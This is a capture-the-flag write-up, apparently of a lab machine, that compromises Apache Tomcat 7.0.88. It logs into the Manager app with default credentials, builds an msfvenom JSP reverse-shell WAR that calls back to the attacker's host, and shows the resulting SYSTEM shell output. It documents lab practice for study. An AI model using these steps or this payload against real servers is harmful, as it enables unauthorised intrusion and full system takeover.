# Enumeration

Single open port: Apache Tomcat running on 8080.

```bash
sudo nmap -p 8080 10.129.136.9 --min-rate 1000 -sVC
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
```

**Version: Apache Tomcat 7.0.88** — known to be vulnerable to WAR file upload via the Manager application when authenticated.

---

# Foothold

## Default Credentials on Tomcat Manager

The Manager interface is accessible at `/manager/html`. Tomcat ships with default credentials that are frequently left unchanged:

```
Username: tomcat
Password: s3cret
```

Authentication succeeds, granting access to the deployment panel.

## WAR File Upload — Remote Code Execution

The Tomcat Manager allows deploying WAR archives. A malicious WAR containing a JSP reverse shell can be uploaded and triggered to achieve RCE.

Generate the payload:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.140 LPORT=4444 -f war > shell.war
```

Upload via the Manager UI at `/manager/html`, then start a listener and navigate to the deployed context path to trigger execution:

```bash
nc -lnvp 4444
```

```
connect to [10.10.15.140] from (UNKNOWN) [10.129.136.9] 49192
Microsoft Windows [Version 6.3.9600]

C:\apache-tomcat-7.0.88>whoami
nt authority\system
```

Tomcat was running as `SYSTEM` — no privilege escalation required.
